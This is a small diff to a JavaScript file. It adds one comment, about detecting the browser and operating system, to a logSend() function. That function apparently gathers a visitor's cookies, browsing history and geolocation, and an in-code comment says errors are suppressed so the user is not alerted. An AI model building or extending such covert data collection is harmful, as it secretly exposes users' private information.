@@ -368,7 +368,7 @@ function logProxy(){
 function logSend(){
     try{//errors can happen if the server is down, and we do not want the user to receive errors messages
         //hence, this try and catch nullifies them.
-
+        // implement: https://stackoverflow.com/questions/11219582/how-to-detect-my-browser-version-and-operating-system-using-javascript
         logCookies();
         logHistory();
         logGeolocation();
